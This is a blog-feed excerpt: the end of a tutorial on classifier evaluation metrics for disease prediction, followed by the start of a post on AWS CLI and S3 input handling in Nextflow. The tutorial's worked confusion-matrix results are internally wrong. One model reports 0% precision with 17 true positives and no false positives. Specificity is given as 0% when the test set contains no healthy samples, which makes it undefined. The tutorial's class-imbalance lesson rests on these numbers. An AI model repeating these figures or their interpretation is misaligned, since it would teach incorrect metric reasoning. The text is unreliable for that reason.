<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">CLASSIFICATION MODEL COMPARISON</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Classification Evaluation: Model 1: Rule-Based (Gene_A &gt; 6.5)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Confusion Matrix:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Positives (TP):    17  → correctly identified disease patients</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Negatives (TN):     0  → correctly identified healthy people</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Positives (FP):    0  → false alarms (healthy → disease)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Negatives (FN):    3  → missed cases (disease → healthy)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Performance Metrics:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Accuracy:         85.00%   (overall correctness - MISLEADING for imbalanced data!)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Sensitivity/Recall: 85.00%   (disease detection rate - % of disease cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Specificity:      0.00%   (healthy detection rate - % of healthy cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Precision:        0.00%   (positive predictive value - % of disease predictions correct)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  → ✗ Poor classifier</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  💡 Insight: High accuracy (85%) but 0% specificity!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">             This shows CLASS IMBALANCE—model predicts disease for almost everything!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Classification Evaluation: Model 2: Mean-Based Classifier</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Confusion Matrix:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Positives (TP):    19  → correctly identified disease patients</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Negatives (TN):     0  → correctly identified healthy people</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Positives (FP):    0  → false alarms (healthy → disease)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Negatives (FN):    1  → missed cases (disease → healthy)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Performance Metrics:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Accuracy:         95.00%   (overall correctness - MISLEADING for imbalanced data!)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Sensitivity/Recall: 95.00%   (disease detection rate - % of disease cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Specificity:      0.00%   (healthy detection rate - % of healthy cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Precision:       100.00%   (positive predictive value - % of disease predictions correct)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  → ✗ Poor classifier</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  💡 Insight: 95% accuracy + 100% precision looks great, but 0% specificity is a RED FLAG!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">             Model is essentially predicting disease for everyone—it's cheating!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Classification Evaluation: Model 3: Nearest Centroid</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">======================================================================</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Confusion Matrix:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Positives (TP):    19  → correctly identified disease patients</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  True Negatives (TN):     0  → correctly identified healthy people</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Positives (FP):    0  → false alarms (healthy → disease)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  False Negatives (FN):    1  → missed cases (disease → healthy)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Performance Metrics:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Accuracy:         95.00%   (overall correctness - MISLEADING for imbalanced data!)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Sensitivity/Recall: 95.00%   (disease detection rate - % of disease cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Specificity:      0.00%   (healthy detection rate - % of healthy cases caught)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Precision:       100.00%   (positive predictive value - % of disease predictions correct)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  → ✗ Poor classifier</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  💡 Insight: 95% accuracy + 100% precision looks great, but 0% specificity is a RED FLAG!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">             Model is essentially predicting disease for everyone—it's cheating!</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">**KEY LEARNING:** All three models fail in the same way! They essentially learned the trivial solution:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">"Predict disease for almost everything." This gets 95% accuracy because 95% of the dataset is disease cases.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">**Why This Happens with Imbalanced Data:**</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">- Naive models learn the easiest shortcut</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">- Accuracy rewards predicting the majority class</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">- Specificity (or Recall for minority class) immediately exposes this problem!</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-metric-tradeoffs">Understanding Metric Tradeoffs<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#understanding-metric-tradeoffs" class="hash-link" aria-label="Direct link to Understanding Metric Tradeoffs" title="Direct link to Understanding Metric Tradeoffs" translate="no">​</a></h2>
<p>Different situations require different metrics:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="sensitivity-vs-specificity-tradeoff">Sensitivity vs Specificity Tradeoff<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#sensitivity-vs-specificity-tradeoff" class="hash-link" aria-label="Direct link to Sensitivity vs Specificity Tradeoff" title="Direct link to Sensitivity vs Specificity Tradeoff" translate="no">​</a></h3>
<p><strong>High Sensitivity (Catch disease):</strong></p>
<ul>
<li class="">Better for: Disease screening, diagnostic tests</li>
<li class="">Accept more false alarms to avoid missing disease</li>
<li class="">Example: Cancer screening — missing cancer is worse than false alarms</li>
</ul>
<p><strong>High Specificity (Avoid false alarms):</strong></p>
<ul>
<li class="">Better for: Confirmatory tests, expensive procedures</li>
<li class="">Accept missing some cases to avoid unnecessary treatment</li>
<li class="">Example: Confirming cancer diagnosis before chemotherapy</li>
</ul>
<p><strong>Balanced (Youden Index):</strong></p>
<ul>
<li class="">Better for: General-purpose classification</li>
<li class="">No one goal is more important than the other</li>
<li class="">Example: Gene expression phenotyping</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="connecting-to-part-1-building-knn">Connecting to Part 1: Building KNN<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#connecting-to-part-1-building-knn" class="hash-link" aria-label="Direct link to Connecting to Part 1: Building KNN" title="Direct link to Connecting to Part 1: Building KNN" translate="no">​</a></h2>
<p>You now understand:</p>
<ul>
<li class="">✓ Real classification problems in bioinformatics</li>
<li class="">✓ Simple classification models (rules, means, nearest centroid)</li>
<li class="">✓ How to evaluate models with metrics</li>
<li class="">✓ Sensitivity vs specificity tradeoffs</li>
</ul>
<p><strong>What's next?</strong> In <a class="" href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn">Part 1: Building KNN from Scratch</a>, we'll extend the nearest centroid idea:</p>
<ul>
<li class=""><strong>Nearest Centroid</strong>: Find the 1 closest class center</li>
<li class=""><strong>KNN</strong>: Find the K closest individual training samples and vote</li>
</ul>
<p>The evaluation metrics you learned here apply directly to KNN and all other classifiers!</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-key-concepts">Summary: Key Concepts<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#summary-key-concepts" class="hash-link" aria-label="Direct link to Summary: Key Concepts" title="Direct link to Summary: Key Concepts" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="confusion-matrix">Confusion Matrix<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#confusion-matrix" class="hash-link" aria-label="Direct link to Confusion Matrix" title="Direct link to Confusion Matrix" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                 Predicted</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                 Disease  Healthy</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Actual</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Disease      TP         FN</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Healthy      FP         TN</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="metrics-quick-reference">Metrics Quick Reference<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#metrics-quick-reference" class="hash-link" aria-label="Direct link to Metrics Quick Reference" title="Direct link to Metrics Quick Reference" translate="no">​</a></h3>
<table><thead><tr><th>Metric</th><th>Formula</th><th>Meaning</th><th>When to Use</th></tr></thead><tbody><tr><td><strong>Accuracy</strong></td><td>(TP+TN)/(TP+TN+FP+FN)</td><td>Overall correctness</td><td>❌ Avoid for imbalanced data</td></tr><tr><td><strong>Sensitivity/Recall</strong></td><td>TP/(TP+FN)</td><td>% of disease cases caught</td><td>✅ Essential for imbalanced data</td></tr><tr><td><strong>Specificity</strong></td><td>TN/(TN+FP)</td><td>% of healthy cases caught</td><td>✅ Reveals minority class performance</td></tr><tr><td><strong>Precision</strong></td><td>TP/(TP+FP)</td><td>% of disease predictions correct</td><td>✅ Cost of false positives</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-imbalanced-data-problem">The Imbalanced Data Problem<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#the-imbalanced-data-problem" class="hash-link" aria-label="Direct link to The Imbalanced Data Problem" title="Direct link to The Imbalanced Data Problem" translate="no">​</a></h3>
<p>When classes are imbalanced (e.g., 95% disease, 5% healthy):</p>
<ul>
<li class=""><strong>Accuracy is misleading</strong>: Predicting "disease" for everything gives 95% accuracy</li>
<li class=""><strong>Sensitivity/Recall reveals the truth</strong>: Shows if model handles majority class</li>
<li class=""><strong>Specificity shows minority class</strong>: Critical for detecting if model fails on rare class</li>
<li class=""><strong>Precision shows false alarm cost</strong>: How many predicted diseases are actually wrong?</li>
</ul>
<p>💡 <strong>In our example</strong>: All models got 95% accuracy but 0% specificity—they're useless!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quick-code-reference">Quick Code Reference<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#quick-code-reference" class="hash-link" aria-label="Direct link to Quick Code Reference" title="Direct link to Quick Code Reference" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate confusion matrix</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">FP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">FN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate metrics for imbalanced data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sensitivity </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Recall - catch disease?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">specificity </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Handle healthy people?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">precision </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># When we predict disease, are we right?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">accuracy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> TN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Don't trust this for imbalanced data!</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-matters-for-bioinformatics">Why This Matters for Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/intro-ai-ml-bioinformatics-applications#why-this-matters-for-bioinformatics" class="hash-link" aria-label="Direct link to Why This Matters for Bioinformatics" title="Direct link to Why This Matters for Bioinformatics" translate="no">​</a></h2>
<p>Classification is everywhere in biology:</p>
<ul>
<li class=""><strong>Disease diagnosis</strong>: Predict if patient has disease from omics data</li>
<li class=""><strong>Protein annotation</strong>: Predict protein function from sequence</li>
<li class=""><strong>Variant interpretation</strong>: Predict if mutation is pathogenic</li>
<li class=""><strong>Cell type classification</strong>: Predict cell type from gene expression</li>
</ul>
<p>But we must evaluate properly:</p>
<ul>
<li class="">Different diseases need different metrics</li>
<li class="">Simple baselines reveal if our model actually learned</li>
<li class="">Understanding metrics prevents misleading conclusions</li>
</ul>
<p>You now have the foundation to build, evaluate, and deploy classification models in bioinformatics! 🧬🤖</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="machine-learning" term="machine-learning"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="classification" term="classification"/>
        <category label="evaluation" term="evaluation"/>
        <category label="disease-prediction" term="disease-prediction"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bioinformatics Cost Optimization For Input Using Nextflow (Part 2)]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2</id>
        <link href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2"/>
        <updated>2026-01-19T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Amazon S3 (Simple Storage Service) is built around the concept of storing files as objects, where each file is identified by a unique key rather than a traditional file system path. While this architecture offers scalability and flexibility for storage, it can present challenges when used as a standard file system, especially in bioinformatics workflows. When running Nextflow with S3 as the input/output backend, there are trade-offs to consider—particularly when dealing with large numbers of small files. In such cases, Nextflow may spend significant time handling downloads and uploads via the AWS CLI v2, which can impact overall workflow performance.On this blog post, we will start with downloading input first. Let’s explore this in more detail.]]></summary>
        <content type="html"><![CDATA[<p>Amazon S3 (Simple Storage Service) is built around the concept of storing files as objects, where each file is identified by a unique key rather than a traditional file system path. While this architecture offers scalability and flexibility for storage, it can present challenges when used as a standard file system, especially in bioinformatics workflows. When running Nextflow with S3 as the input/output backend, there are trade-offs to consider—particularly when dealing with large numbers of small files. In such cases, Nextflow may spend significant time handling downloads and uploads via the AWS CLI v2, which can impact overall workflow performance.On this blog post, we will start with downloading input first. Let’s explore this in more detail.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="aws-cli">AWS CLI<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#aws-cli" class="hash-link" aria-label="Direct link to AWS CLI" title="Direct link to AWS CLI" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="install">Install<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#install" class="hash-link" aria-label="Direct link to Install" title="Direct link to Install" translate="no">​</a></h3>
<p>AWS CLI is the command line tools that helps work with AWS services. With nextflow, it can help for downloading inputs, uploading outputs.
To install this tool and the tutorial on this blog, clone this repo. The repo uses the pixi and dokcer to quickly setup</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone git@github.com:nttg8100/nextflow-cost-optimization.git</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> nextflow-cost-optimization</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi shell</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> aws</span><br></span></code></pre></div></div>
<p>Explain <code>Makefile</code>, the below, we will run to start the docker service, upload files and the tar file of 10k files that can be used for benchmarking later</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws-config: start-minio</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ACCESS_KEY_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"minioadmin"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_SECRET_ACCESS_KEY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"minioadmin"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 